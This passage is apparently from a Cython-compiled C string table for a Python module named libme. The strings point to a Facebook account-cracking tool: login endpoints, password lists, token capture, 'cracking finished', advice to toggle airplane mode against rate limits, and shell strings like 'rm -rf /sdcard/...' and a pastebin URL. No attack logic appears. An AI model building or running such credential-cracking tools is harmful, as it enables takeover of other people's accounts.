  {&__pyx_n_s_confirm, __pyx_k_confirm, sizeof(__pyx_k_confirm), 0, 0, 1, 1},
  {&__pyx_kp_s_content_type, __pyx_k_content_type, sizeof(__pyx_k_content_type), 0, 0, 1, 0},
  {&__pyx_n_s_cookies, __pyx_k_cookies, sizeof(__pyx_k_cookies), 0, 0, 1, 1},
  {&__pyx_n_s_cp, __pyx_k_cp, sizeof(__pyx_k_cp), 0, 0, 1, 1},
  {&__pyx_kp_s_cracking_finished, __pyx_k_cracking_finished, sizeof(__pyx_k_cracking_finished), 0, 0, 1, 0},
  {&__pyx_kp_s_credentials_type_device_based_l, __pyx_k_credentials_type_device_based_l, sizeof(__pyx_k_credentials_type_device_based_l), 0, 0, 1, 0},
  {&__pyx_n_s_ct, __pyx_k_ct, sizeof(__pyx_k_ct), 0, 0, 1, 1},
  {&__pyx_n_s_cuid, __pyx_k_cuid, sizeof(__pyx_k_cuid), 0, 0, 1, 1},
  {&__pyx_n_s_current, __pyx_k_current, sizeof(__pyx_k_current), 0, 0, 1, 1},
  {&__pyx_n_s_data, __pyx_k_data, sizeof(__pyx_k_data), 0, 0, 1, 1},
  {&__pyx_n_s_date, __pyx_k_date, sizeof(__pyx_k_date), 0, 0, 1, 1},
  {&__pyx_n_s_datetime, __pyx_k_datetime, sizeof(__pyx_k_datetime), 0, 0, 1, 1},
  {&__pyx_n_s_day, __pyx_k_day, sizeof(__pyx_k_day), 0, 0, 1, 1},
  {&__pyx_n_s_day_name, __pyx_k_day_name, sizeof(__pyx_k_day_name), 0, 0, 1, 1},
  {&__pyx_kp_s_dev_null, __pyx_k_dev_null, sizeof(__pyx_k_dev_null), 0, 0, 1, 0},
  {&__pyx_n_s_doc, __pyx_k_doc, sizeof(__pyx_k_doc), 0, 0, 1, 1},
  {&__pyx_n_s_e, __pyx_k_e, sizeof(__pyx_k_e), 0, 0, 1, 1},
  {&__pyx_n_s_email, __pyx_k_email, sizeof(__pyx_k_email), 0, 0, 1, 1},
  {&__pyx_n_s_end, __pyx_k_end, sizeof(__pyx_k_end), 0, 0, 1, 1},
  {&__pyx_n_s_enter, __pyx_k_enter, sizeof(__pyx_k_enter), 0, 0, 1, 1},
  {&__pyx_n_s_error_msg, __pyx_k_error_msg, sizeof(__pyx_k_error_msg), 0, 0, 1, 1},
  {&__pyx_n_s_ex, __pyx_k_ex, sizeof(__pyx_k_ex), 0, 0, 1, 1},
  {&__pyx_n_s_exceptions, __pyx_k_exceptions, sizeof(__pyx_k_exceptions), 0, 0, 1, 1},
  {&__pyx_n_s_exit, __pyx_k_exit, sizeof(__pyx_k_exit), 0, 0, 1, 1},
  {&__pyx_n_s_exit_2, __pyx_k_exit_2, sizeof(__pyx_k_exit_2), 0, 0, 1, 1},
  {&__pyx_n_s_expired, __pyx_k_expired, sizeof(__pyx_k_expired), 0, 0, 1, 1},
  {&__pyx_kp_s_expired_tokens, __pyx_k_expired_tokens, sizeof(__pyx_k_expired_tokens), 0, 0, 1, 0},
  {&__pyx_n_s_f_james, __pyx_k_f_james, sizeof(__pyx_k_f_james), 0, 0, 1, 1},
  {&__pyx_n_s_false, __pyx_k_false, sizeof(__pyx_k_false), 0, 0, 1, 1},
  {&__pyx_n_s_fb, __pyx_k_fb, sizeof(__pyx_k_fb), 0, 0, 1, 1},
  {&__pyx_n_s_fb2, __pyx_k_fb2, sizeof(__pyx_k_fb2), 0, 0, 1, 1},
  {&__pyx_n_s_fb3, __pyx_k_fb3, sizeof(__pyx_k_fb3), 0, 0, 1, 1},
  {&__pyx_n_s_fb4, __pyx_k_fb4, sizeof(__pyx_k_fb4), 0, 0, 1, 1},
  {&__pyx_n_s_fb_noscript, __pyx_k_fb_noscript, sizeof(__pyx_k_fb_noscript), 0, 0, 1, 1},
  {&__pyx_n_s_file, __pyx_k_file, sizeof(__pyx_k_file), 0, 0, 1, 1},
  {&__pyx_n_s_file_2, __pyx_k_file_2, sizeof(__pyx_k_file_2), 0, 0, 1, 1},
  {&__pyx_n_s_file_3, __pyx_k_file_3, sizeof(__pyx_k_file_3), 0, 0, 1, 1},
  {&__pyx_n_s_file_4, __pyx_k_file_4, sizeof(__pyx_k_file_4), 0, 0, 1, 1},
  {&__pyx_n_s_findall, __pyx_k_findall, sizeof(__pyx_k_findall), 0, 0, 1, 1},
  {&__pyx_n_s_first_prefill_source, __pyx_k_first_prefill_source, sizeof(__pyx_k_first_prefill_source), 0, 0, 1, 1},
  {&__pyx_n_s_first_prefill_type, __pyx_k_first_prefill_type, sizeof(__pyx_k_first_prefill_type), 0, 0, 1, 1},
  {&__pyx_n_s_flush, __pyx_k_flush, sizeof(__pyx_k_flush), 0, 0, 1, 1},
  {&__pyx_n_s_friends, __pyx_k_friends, sizeof(__pyx_k_friends), 0, 0, 1, 1},
  {&__pyx_n_s_ft, __pyx_k_ft, sizeof(__pyx_k_ft), 0, 0, 1, 1},
  {&__pyx_n_s_gaaa, __pyx_k_gaaa, sizeof(__pyx_k_gaaa), 0, 0, 1, 1},
  {&__pyx_n_s_get, __pyx_k_get, sizeof(__pyx_k_get), 0, 0, 1, 1},
  {&__pyx_n_s_get_dict, __pyx_k_get_dict, sizeof(__pyx_k_get_dict), 0, 0, 1, 1},
  {&__pyx_n_s_getpass, __pyx_k_getpass, sizeof(__pyx_k_getpass), 0, 0, 1, 1},
  {&__pyx_kp_s_git_pull, __pyx_k_git_pull, sizeof(__pyx_k_git_pull), 0, 0, 1, 0},
  {&__pyx_kp_s_gzip_deflate, __pyx_k_gzip_deflate, sizeof(__pyx_k_gzip_deflate), 0, 0, 1, 0},
  {&__pyx_n_s_ha, __pyx_k_ha, sizeof(__pyx_k_ha), 0, 0, 1, 1},
  {&__pyx_n_s_had_cp_prefilled, __pyx_k_had_cp_prefilled, sizeof(__pyx_k_had_cp_prefilled), 0, 0, 1, 1},
  {&__pyx_n_s_had_password_prefilled, __pyx_k_had_password_prefilled, sizeof(__pyx_k_had_password_prefilled), 0, 0, 1, 1},
  {&__pyx_n_s_hashlib, __pyx_k_hashlib, sizeof(__pyx_k_hashlib), 0, 0, 1, 1},
  {&__pyx_n_s_headers, __pyx_k_headers, sizeof(__pyx_k_headers), 0, 0, 1, 1},
  {&__pyx_n_s_hex, __pyx_k_hex, sizeof(__pyx_k_hex), 0, 0, 1, 1},
  {&__pyx_n_s_home, __pyx_k_home, sizeof(__pyx_k_home), 0, 0, 1, 1},
  {&__pyx_n_s_host, __pyx_k_host, sizeof(__pyx_k_host), 0, 0, 1, 1},
  {&__pyx_n_s_hr, __pyx_k_hr, sizeof(__pyx_k_hr), 0, 0, 1, 1},
  {&__pyx_kp_s_html_parser, __pyx_k_html_parser, sizeof(__pyx_k_html_parser), 0, 0, 1, 0},
  {&__pyx_kp_s_https_api_asutoolkit_cloudaccess, __pyx_k_https_api_asutoolkit_cloudaccess, sizeof(__pyx_k_https_api_asutoolkit_cloudaccess), 0, 0, 1, 0},
  {&__pyx_kp_s_https_b_api_facebook_com_method, __pyx_k_https_b_api_facebook_com_method, sizeof(__pyx_k_https_b_api_facebook_com_method), 0, 0, 1, 0},
  {&__pyx_kp_s_https_free_facebook_com, __pyx_k_https_free_facebook_com, sizeof(__pyx_k_https_free_facebook_com), 0, 0, 1, 0},
  {&__pyx_kp_s_https_graph_facebook_com_1000070, __pyx_k_https_graph_facebook_com_1000070, sizeof(__pyx_k_https_graph_facebook_com_1000070), 0, 0, 1, 0},
  {&__pyx_kp_s_https_graph_facebook_com_2614119, __pyx_k_https_graph_facebook_com_2614119, sizeof(__pyx_k_https_graph_facebook_com_2614119), 0, 0, 1, 0},
  {&__pyx_kp_s_https_graph_facebook_com_2867565, __pyx_k_https_graph_facebook_com_2867565, sizeof(__pyx_k_https_graph_facebook_com_2867565), 0, 0, 1, 0},
  {&__pyx_kp_s_https_graph_facebook_com_2985411, __pyx_k_https_graph_facebook_com_2985411, sizeof(__pyx_k_https_graph_facebook_com_2985411), 0, 0, 1, 0},
  {&__pyx_kp_s_https_graph_facebook_com_3048075, __pyx_k_https_graph_facebook_com_3048075, sizeof(__pyx_k_https_graph_facebook_com_3048075), 0, 0, 1, 0},
  {&__pyx_kp_s_https_graph_facebook_com_me_acce, __pyx_k_https_graph_facebook_com_me_acce, sizeof(__pyx_k_https_graph_facebook_com_me_acce), 0, 0, 1, 0},
  {&__pyx_kp_s_https_graph_facebook_com_me_acce_2, __pyx_k_https_graph_facebook_com_me_acce_2, sizeof(__pyx_k_https_graph_facebook_com_me_acce_2), 0, 0, 1, 0},
  {&__pyx_kp_s_https_graph_facebook_com_s_field, __pyx_k_https_graph_facebook_com_s_field, sizeof(__pyx_k_https_graph_facebook_com_s_field), 0, 0, 1, 0},
  {&__pyx_kp_s_https_james_anggakurniawan_my_id, __pyx_k_https_james_anggakurniawan_my_id, sizeof(__pyx_k_https_james_anggakurniawan_my_id), 0, 0, 1, 0},
  {&__pyx_kp_s_https_mbasic_facebook_com, __pyx_k_https_mbasic_facebook_com, sizeof(__pyx_k_https_mbasic_facebook_com), 0, 0, 1, 0},
  {&__pyx_kp_s_https_mbasic_facebook_com_login, __pyx_k_https_mbasic_facebook_com_login, sizeof(__pyx_k_https_mbasic_facebook_com_login), 0, 0, 1, 0},
  {&__pyx_kp_s_https_pastebin_com_raw_2ivpYP20, __pyx_k_https_pastebin_com_raw_2ivpYP20, sizeof(__pyx_k_https_pastebin_com_raw_2ivpYP20), 0, 0, 1, 0},
  {&__pyx_n_s_hulu, __pyx_k_hulu, sizeof(__pyx_k_hulu), 0, 0, 1, 1},
  {&__pyx_n_s_i, __pyx_k_i, sizeof(__pyx_k_i), 0, 0, 1, 1},
  {&__pyx_n_s_ib, __pyx_k_ib, sizeof(__pyx_k_ib), 0, 0, 1, 1},
  {&__pyx_n_s_id, __pyx_k_id, sizeof(__pyx_k_id), 0, 0, 1, 1},
  {&__pyx_n_s_id1, __pyx_k_id1, sizeof(__pyx_k_id1), 0, 0, 1, 1},
  {&__pyx_n_s_id2, __pyx_k_id2, sizeof(__pyx_k_id2), 0, 0, 1, 1},
  {&__pyx_n_s_id_2, __pyx_k_id_2, sizeof(__pyx_k_id_2), 0, 0, 1, 1},
  {&__pyx_kp_s_id_ID_id_q_0_9_en_US_q_0_8_en_q, __pyx_k_id_ID_id_q_0_9_en_US_q_0_8_en_q, sizeof(__pyx_k_id_ID_id_q_0_9_en_US_q_0_8_en_q), 0, 0, 1, 0},
  {&__pyx_n_s_ids, __pyx_k_ids, sizeof(__pyx_k_ids), 0, 0, 1, 1},
  {&__pyx_n_s_idx, __pyx_k_idx, sizeof(__pyx_k_idx), 0, 0, 1, 1},
  {&__pyx_kp_s_if_no_result_turn_on_airplane_m, __pyx_k_if_no_result_turn_on_airplane_m, sizeof(__pyx_k_if_no_result_turn_on_airplane_m), 0, 0, 1, 0},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_init, __pyx_k_init, sizeof(__pyx_k_init), 0, 0, 1, 1},
  {&__pyx_n_s_input, __pyx_k_input, sizeof(__pyx_k_input), 0, 0, 1, 1},
  {&__pyx_n_s_ip, __pyx_k_ip, sizeof(__pyx_k_ip), 0, 0, 1, 1},
  {&__pyx_n_s_is_smart_lock, __pyx_k_is_smart_lock, sizeof(__pyx_k_is_smart_lock), 0, 0, 1, 1},
  {&__pyx_n_s_items, __pyx_k_items, sizeof(__pyx_k_items), 0, 0, 1, 1},
  {&__pyx_n_s_james, __pyx_k_james, sizeof(__pyx_k_james), 0, 0, 1, 1},
  {&__pyx_kp_s_james_bs4_module_is_not_install, __pyx_k_james_bs4_module_is_not_install, sizeof(__pyx_k_james_bs4_module_is_not_install), 0, 0, 1, 0},
  {&__pyx_kp_s_james_futures_module_not_instal, __pyx_k_james_futures_module_not_instal, sizeof(__pyx_k_james_futures_module_not_instal), 0, 0, 1, 0},
  {&__pyx_kp_s_james_requests_module_is_not_in, __pyx_k_james_requests_module_is_not_in, sizeof(__pyx_k_james_requests_module_is_not_in), 0, 0, 1, 0},
  {&__pyx_n_s_jazoest, __pyx_k_jazoest, sizeof(__pyx_k_jazoest), 0, 0, 1, 1},
  {&__pyx_n_s_join, __pyx_k_join, sizeof(__pyx_k_join), 0, 0, 1, 1},
  {&__pyx_n_s_json, __pyx_k_json, sizeof(__pyx_k_json), 0, 0, 1, 1},
  {&__pyx_n_s_key, __pyx_k_key, sizeof(__pyx_k_key), 0, 0, 1, 1},
  {&__pyx_n_s_keys, __pyx_k_keys, sizeof(__pyx_k_keys), 0, 0, 1, 1},
  {&__pyx_n_s_kuki, __pyx_k_kuki, sizeof(__pyx_k_kuki), 0, 0, 1, 1},
  {&__pyx_n_s_kwargs, __pyx_k_kwargs, sizeof(__pyx_k_kwargs), 0, 0, 1, 1},
  {&__pyx_n_s_li, __pyx_k_li, sizeof(__pyx_k_li), 0, 0, 1, 1},
  {&__pyx_n_s_libme, __pyx_k_libme, sizeof(__pyx_k_libme), 0, 0, 1, 1},
  {&__pyx_kp_s_libme_pyx, __pyx_k_libme_pyx, sizeof(__pyx_k_libme_pyx), 0, 0, 1, 0},
  {&__pyx_n_s_limit, __pyx_k_limit, sizeof(__pyx_k_limit), 0, 0, 1, 1},
  {&__pyx_n_s_line, __pyx_k_line, sizeof(__pyx_k_line), 0, 0, 1, 1},
  {&__pyx_n_s_listpass, __pyx_k_listpass, sizeof(__pyx_k_listpass), 0, 0, 1, 1},
  {&__pyx_n_s_loads, __pyx_k_loads, sizeof(__pyx_k_loads), 0, 0, 1, 1},
  {&__pyx_n_s_login, __pyx_k_login, sizeof(__pyx_k_login), 0, 0, 1, 1},
  {&__pyx_n_s_login_2, __pyx_k_login_2, sizeof(__pyx_k_login_2), 0, 0, 1, 1},
  {&__pyx_kp_s_login_device_based_regular_logi, __pyx_k_login_device_based_regular_logi, sizeof(__pyx_k_login_device_based_regular_logi), 0, 0, 1, 0},
  {&__pyx_kp_s_login_next_ref_dbl_fl_refid_8, __pyx_k_login_next_ref_dbl_fl_refid_8, sizeof(__pyx_k_login_next_ref_dbl_fl_refid_8), 0, 0, 1, 0},
  {&__pyx_kp_s_login_next_ref_dbl_refid_8, __pyx_k_login_next_ref_dbl_refid_8, sizeof(__pyx_k_login_next_ref_dbl_refid_8), 0, 0, 1, 0},
  {&__pyx_kp_s_login_txt, __pyx_k_login_txt, sizeof(__pyx_k_login_txt), 0, 0, 1, 0},
  {&__pyx_n_s_loop, __pyx_k_loop, sizeof(__pyx_k_loop), 0, 0, 1, 1},
  {&__pyx_n_s_love, __pyx_k_love, sizeof(__pyx_k_love), 0, 0, 1, 1},
  {&__pyx_n_s_lower, __pyx_k_lower, sizeof(__pyx_k_lower), 0, 0, 1, 1},
  {&__pyx_n_s_lsd, __pyx_k_lsd, sizeof(__pyx_k_lsd), 0, 0, 1, 1},
  {&__pyx_n_s_lulu, __pyx_k_lulu, sizeof(__pyx_k_lulu), 0, 0, 1, 1},
  {&__pyx_n_s_m_ts, __pyx_k_m_ts, sizeof(__pyx_k_m_ts), 0, 0, 1, 1},
  {&__pyx_n_s_ma___sal2, __pyx_k_ma___sal2, sizeof(__pyx_k_ma___sal2), 0, 0, 1, 1},
  {&__pyx_n_s_ma__sal2, __pyx_k_ma__sal2, sizeof(__pyx_k_ma__sal2), 0, 0, 1, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_n_s_main_coeg, __pyx_k_main_coeg, sizeof(__pyx_k_main_coeg), 0, 0, 1, 1},
  {&__pyx_n_s_masal, __pyx_k_masal, sizeof(__pyx_k_masal), 0, 0, 1, 1},
  {&__pyx_n_s_masal2, __pyx_k_masal2, sizeof(__pyx_k_masal2), 0, 0, 1, 1},
  {&__pyx_kp_s_max_age_0, __pyx_k_max_age_0, sizeof(__pyx_k_max_age_0), 0, 0, 1, 0},
  {&__pyx_n_s_max_workers, __pyx_k_max_workers, sizeof(__pyx_k_max_workers), 0, 0, 1, 1},
  {&__pyx_n_s_me__nnn, __pyx_k_me__nnn, sizeof(__pyx_k_me__nnn), 0, 0, 1, 1},
  {&__pyx_n_s_member, __pyx_k_member, sizeof(__pyx_k_member), 0, 0, 1, 1},
  {&__pyx_n_s_menn, __pyx_k_menn, sizeof(__pyx_k_menn), 0, 0, 1, 1},
  {&__pyx_n_s_mennn, __pyx_k_mennn, sizeof(__pyx_k_mennn), 0, 0, 1, 1},
  {&__pyx_n_s_menu__file, __pyx_k_menu__file, sizeof(__pyx_k_menu__file), 0, 0, 1, 1},
  {&__pyx_n_s_menu_file, __pyx_k_menu_file, sizeof(__pyx_k_menu_file), 0, 0, 1, 1},
  {&__pyx_n_s_metaclass, __pyx_k_metaclass, sizeof(__pyx_k_metaclass), 0, 0, 1, 1},
  {&__pyx_n_s_method__1, __pyx_k_method__1, sizeof(__pyx_k_method__1), 0, 0, 1, 1},
  {&__pyx_n_s_method__2, __pyx_k_method__2, sizeof(__pyx_k_method__2), 0, 0, 1, 1},
  {&__pyx_n_s_mkdir, __pyx_k_mkdir, sizeof(__pyx_k_mkdir), 0, 0, 1, 1},
  {&__pyx_n_s_module, __pyx_k_module, sizeof(__pyx_k_module), 0, 0, 1, 1},
  {&__pyx_n_s_month, __pyx_k_month, sizeof(__pyx_k_month), 0, 0, 1, 1},
  {&__pyx_n_s_my_date, __pyx_k_my_date, sizeof(__pyx_k_my_date), 0, 0, 1, 1},
  {&__pyx_n_s_myfile, __pyx_k_myfile, sizeof(__pyx_k_myfile), 0, 0, 1, 1},
  {&__pyx_n_s_n, __pyx_k_n, sizeof(__pyx_k_n), 0, 0, 1, 1},
  {&__pyx_n_s_nTemp, __pyx_k_nTemp, sizeof(__pyx_k_nTemp), 0, 0, 1, 1},
  {&__pyx_n_s_nama, __pyx_k_nama, sizeof(__pyx_k_nama), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_n_s_name_2, __pyx_k_name_2, sizeof(__pyx_k_name_2), 0, 0, 1, 1},
  {&__pyx_kp_s_noscript_1, __pyx_k_noscript_1, sizeof(__pyx_k_noscript_1), 0, 0, 1, 0},
  {&__pyx_n_s_now, __pyx_k_now, sizeof(__pyx_k_now), 0, 0, 1, 1},
  {&__pyx_n_s_ok, __pyx_k_ok, sizeof(__pyx_k_ok), 0, 0, 1, 1},
  {&__pyx_n_s_op, __pyx_k_op, sizeof(__pyx_k_op), 0, 0, 1, 1},
  {&__pyx_n_s_open, __pyx_k_open, sizeof(__pyx_k_open), 0, 0, 1, 1},
  {&__pyx_n_s_origin, __pyx_k_origin, sizeof(__pyx_k_origin), 0, 0, 1, 1},
  {&__pyx_n_s_os, __pyx_k_os, sizeof(__pyx_k_os), 0, 0, 1, 1},
  {&__pyx_n_s_p, __pyx_k_p, sizeof(__pyx_k_p), 0, 0, 1, 1},
  {&__pyx_n_s_parser, __pyx_k_parser, sizeof(__pyx_k_parser), 0, 0, 1, 1},
  {&__pyx_n_s_pass, __pyx_k_pass, sizeof(__pyx_k_pass), 0, 0, 1, 1},
  {&__pyx_kp_s_password, __pyx_k_password, sizeof(__pyx_k_password), 0, 0, 1, 0},
  {&__pyx_kp_s_password_minimum_6_characters, __pyx_k_password_minimum_6_characters, sizeof(__pyx_k_password_minimum_6_characters), 0, 0, 1, 0},
  {&__pyx_n_s_pastefile, __pyx_k_pastefile, sizeof(__pyx_k_pastefile), 0, 0, 1, 1},
  {&__pyx_kp_s_pip_install_bs4, __pyx_k_pip_install_bs4, sizeof(__pyx_k_pip_install_bs4), 0, 0, 1, 0},
  {&__pyx_kp_s_pip_install_futures, __pyx_k_pip_install_futures, sizeof(__pyx_k_pip_install_futures), 0, 0, 1, 0},
  {&__pyx_kp_s_pip_install_requests, __pyx_k_pip_install_requests, sizeof(__pyx_k_pip_install_requests), 0, 0, 1, 0},
  {&__pyx_n_s_post, __pyx_k_post, sizeof(__pyx_k_post), 0, 0, 1, 1},
  {&__pyx_n_s_prefill_contact_point, __pyx_k_prefill_contact_point, sizeof(__pyx_k_prefill_contact_point), 0, 0, 1, 1},
  {&__pyx_n_s_prefill_source, __pyx_k_prefill_source, sizeof(__pyx_k_prefill_source), 0, 0, 1, 1},
  {&__pyx_n_s_prefill_type, __pyx_k_prefill_type, sizeof(__pyx_k_prefill_type), 0, 0, 1, 1},
  {&__pyx_n_s_prepare, __pyx_k_prepare, sizeof(__pyx_k_prepare), 0, 0, 1, 1},
  {&__pyx_n_s_print, __pyx_k_print, sizeof(__pyx_k_print), 0, 0, 1, 1},
  {&__pyx_n_s_pw, __pyx_k_pw, sizeof(__pyx_k_pw), 0, 0, 1, 1},
  {&__pyx_n_s_pwx, __pyx_k_pwx, sizeof(__pyx_k_pwx), 0, 0, 1, 1},
  {&__pyx_n_s_qualname, __pyx_k_qualname, sizeof(__pyx_k_qualname), 0, 0, 1, 1},
  {&__pyx_n_s_r, __pyx_k_r, sizeof(__pyx_k_r), 0, 0, 1, 1},
  {&__pyx_n_s_randint, __pyx_k_randint, sizeof(__pyx_k_randint), 0, 0, 1, 1},
  {&__pyx_n_s_random, __pyx_k_random, sizeof(__pyx_k_random), 0, 0, 1, 1},
  {&__pyx_n_s_range, __pyx_k_range, sizeof(__pyx_k_range), 0, 0, 1, 1},
  {&__pyx_n_s_re, __pyx_k_re, sizeof(__pyx_k_re), 0, 0, 1, 1},
  {&__pyx_n_s_read, __pyx_k_read, sizeof(__pyx_k_read), 0, 0, 1, 1},
  {&__pyx_n_s_readlines, __pyx_k_readlines, sizeof(__pyx_k_readlines), 0, 0, 1, 1},
  {&__pyx_n_s_referer, __pyx_k_referer, sizeof(__pyx_k_referer), 0, 0, 1, 1},
  {&__pyx_n_s_replace, __pyx_k_replace, sizeof(__pyx_k_replace), 0, 0, 1, 1},
  {&__pyx_n_s_request, __pyx_k_request, sizeof(__pyx_k_request), 0, 0, 1, 1},
  {&__pyx_n_s_requests, __pyx_k_requests, sizeof(__pyx_k_requests), 0, 0, 1, 1},
  {&__pyx_n_s_response, __pyx_k_response, sizeof(__pyx_k_response), 0, 0, 1, 1},
  {&__pyx_n_s_rex, __pyx_k_rex, sizeof(__pyx_k_rex), 0, 0, 1, 1},
  {&__pyx_kp_s_rm_f_login_txt, __pyx_k_rm_f_login_txt, sizeof(__pyx_k_rm_f_login_txt), 0, 0, 1, 0},
  {&__pyx_kp_s_rm_rf_sdcard_1000_txt, __pyx_k_rm_rf_sdcard_1000_txt, sizeof(__pyx_k_rm_rf_sdcard_1000_txt), 0, 0, 1, 0},
  {&__pyx_kp_s_rm_rf_sdcard_100_txt, __pyx_k_rm_rf_sdcard_100_txt, sizeof(__pyx_k_rm_rf_sdcard_100_txt), 0, 0, 1, 0},
  {&__pyx_kp_s_rm_rf_sdcard_10_0_txt, __pyx_k_rm_rf_sdcard_10_0_txt, sizeof(__pyx_k_rm_rf_sdcard_10_0_txt), 0, 0, 1, 0},
  {&__pyx_kp_s_rm_rf_sdcard_f2_txt, __pyx_k_rm_rf_sdcard_f2_txt, sizeof(__pyx_k_rm_rf_sdcard_f2_txt), 0, 0, 1, 0},
  {&__pyx_kp_s_rm_rf_sdcard_f_2_txt, __pyx_k_rm_rf_sdcard_f_2_txt, sizeof(__pyx_k_rm_rf_sdcard_f_2_txt), 0, 0, 1, 0},
  {&__pyx_kp_s_s_s, __pyx_k_s_s, sizeof(__pyx_k_s_s), 0, 0, 1, 0},
  {&__pyx_kp_s_s_s_2, __pyx_k_s_s_2, sizeof(__pyx_k_s_s_2), 0, 0, 1, 0},
  {&__pyx_kp_s_s_s_3, __pyx_k_s_s_3, sizeof(__pyx_k_s_s_3), 0, 0, 1, 0},
  {&__pyx_kp_s_s_s_ok_s_cp_s, __pyx_k_s_s_ok_s_cp_s, sizeof(__pyx_k_s_s_ok_s_cp_s), 0, 0, 1, 0},
  {&__pyx_kp_s_s_s_s, __pyx_k_s_s_s, sizeof(__pyx_k_s_s_s), 0, 0, 1, 0},
  {&__pyx_kp_s_s_s_s_s, __pyx_k_s_s_s_s, sizeof(__pyx_k_s_s_s_s), 0, 0, 1, 0},
  {&__pyx_n_s_save, __pyx_k_save, sizeof(__pyx_k_save), 0, 0, 1, 1},
  {&__pyx_kp_s_sdcard, __pyx_k_sdcard, sizeof(__pyx_k_sdcard), 0, 0, 1, 0},
  {&__pyx_kp_s_sdcard_1000_txt, __pyx_k_sdcard_1000_txt, sizeof(__pyx_k_sdcard_1000_txt), 0, 0, 1, 0},
  {&__pyx_kp_s_sdcard_100_txt, __pyx_k_sdcard_100_txt, sizeof(__pyx_k_sdcard_100_txt), 0, 0, 1, 0},
  {&__pyx_kp_s_sdcard_10_0_txt, __pyx_k_sdcard_10_0_txt, sizeof(__pyx_k_sdcard_10_0_txt), 0, 0, 1, 0},
  {&__pyx_kp_s_sdcard_f2_txt, __pyx_k_sdcard_f2_txt, sizeof(__pyx_k_sdcard_f2_txt), 0, 0, 1, 0},
  {&__pyx_kp_s_sdcard_f_2_txt, __pyx_k_sdcard_f_2_txt, sizeof(__pyx_k_sdcard_f_2_txt), 0, 0, 1, 0},
  {&__pyx_n_s_self, __pyx_k_self, sizeof(__pyx_k_self), 0, 0, 1, 1},
  {&__pyx_n_s_ses, __pyx_k_ses, sizeof(__pyx_k_ses), 0, 0, 1, 1},
  {&__pyx_n_s_session_key, __pyx_k_session_key, sizeof(__pyx_k_session_key), 0, 0, 1, 1},
  {&__pyx_kp_s_sir_big_fan, __pyx_k_sir_big_fan, sizeof(__pyx_k_sir_big_fan), 0, 0, 1, 0},
  {&__pyx_n_s_split, __pyx_k_split, sizeof(__pyx_k_split), 0, 0, 1, 1},
  {&__pyx_n_s_start, __pyx_k_start, sizeof(__pyx_k_start), 0, 0, 1, 1},
  {&__pyx_n_s_status, __pyx_k_status, sizeof(__pyx_k_status), 0, 0, 1, 1},
  {&__pyx_n_s_stdout, __pyx_k_stdout, sizeof(__pyx_k_stdout), 0, 0, 1, 1},
  {&__pyx_kp_s_storage_emulated_0_1000_txt, __pyx_k_storage_emulated_0_1000_txt, sizeof(__pyx_k_storage_emulated_0_1000_txt), 0, 0, 1, 0},
  {&__pyx_kp_s_storage_emulated_0_100_txt, __pyx_k_storage_emulated_0_100_txt, sizeof(__pyx_k_storage_emulated_0_100_txt), 0, 0, 1, 0},
  {&__pyx_kp_s_storage_emulated_0_10_0_txt, __pyx_k_storage_emulated_0_10_0_txt, sizeof(__pyx_k_storage_emulated_0_10_0_txt), 0, 0, 1, 0},
  {&__pyx_kp_s_storage_emulated_0_f2_txt, __pyx_k_storage_emulated_0_f2_txt, sizeof(__pyx_k_storage_emulated_0_f2_txt), 0, 0, 1, 0},
  {&__pyx_kp_s_storage_emulated_0_f_2_txt, __pyx_k_storage_emulated_0_f_2_txt, sizeof(__pyx_k_storage_emulated_0_f_2_txt), 0, 0, 1, 0},
  {&__pyx_kp_s_storage_emulated_0_f__rindlist, __pyx_k_storage_emulated_0_f__rindlist, sizeof(__pyx_k_storage_emulated_0_f__rindlist), 0, 0, 1, 0},
  {&__pyx_n_s_strip, __pyx_k_strip, sizeof(__pyx_k_strip), 0, 0, 1, 1},
  {&__pyx_n_s_submit, __pyx_k_submit, sizeof(__pyx_k_submit), 0, 0, 1, 1},
  {&__pyx_n_s_subprocess, __pyx_k_subprocess, sizeof(__pyx_k_subprocess), 0, 0, 1, 1},
  {&__pyx_kp_s_successful_login_token, __pyx_k_successful_login_token, sizeof(__pyx_k_successful_login_token), 0, 0, 1, 0},
  {&__pyx_n_s_sys, __pyx_k_sys, sizeof(__pyx_k_sys), 0, 0, 1, 1},
  {&__pyx_n_s_system, __pyx_k_system, sizeof(__pyx_k_system), 0, 0, 1, 1},
  {&__pyx_n_s_t, __pyx_k_t, sizeof(__pyx_k_t), 0, 0, 1, 1},
  {&__pyx_n_s_ta, __pyx_k_ta, sizeof(__pyx_k_ta), 0, 0, 1, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {&__pyx_n_s_text, __pyx_k_text, sizeof(__pyx_k_text), 0, 0, 1, 1},
  {&__pyx_kp_s_text_html_application_xhtml_xml, __pyx_k_text_html_application_xhtml_xml, sizeof(__pyx_k_text_html_application_xhtml_xml), 0, 0, 1, 0},
  {&__pyx_n_s_threading, __pyx_k_threading, sizeof(__pyx_k_threading), 0, 0, 1, 1},
  {&__pyx_n_s_time, __pyx_k_time, sizeof(__pyx_k_time), 0, 0, 1, 1},
  {&__pyx_n_s_today, __pyx_k_today, sizeof(__pyx_k_today), 0, 0, 1, 1},
  {&__pyx_n_s_token, __pyx_k_token, sizeof(__pyx_k_token), 0, 0, 1, 1},
  {&__pyx_n_s_total, __pyx_k_total, sizeof(__pyx_k_total), 0, 0, 1, 1},
  {&__pyx_kp_s_touch_login_txt, __pyx_k_touch_login_txt, sizeof(__pyx_k_touch_login_txt), 0, 0, 1, 0},
  {&__pyx_n_s_true, __pyx_k_true, sizeof(__pyx_k_true), 0, 0, 1, 1},
  {&__pyx_n_s_try_number, __pyx_k_try_number, sizeof(__pyx_k_try_number), 0, 0, 1, 1},
  {&__pyx_n_s_ua, __pyx_k_ua, sizeof(__pyx_k_ua), 0, 0, 1, 1},
  {&__pyx_n_s_uid, __pyx_k_uid, sizeof(__pyx_k_uid), 0, 0, 1, 1},
  {&__pyx_n_s_unrecognized_tries, __pyx_k_unrecognized_tries, sizeof(__pyx_k_unrecognized_tries), 0, 0, 1, 1},
  {&__pyx_n_s_update, __pyx_k_update, sizeof(__pyx_k_update), 0, 0, 1, 1},
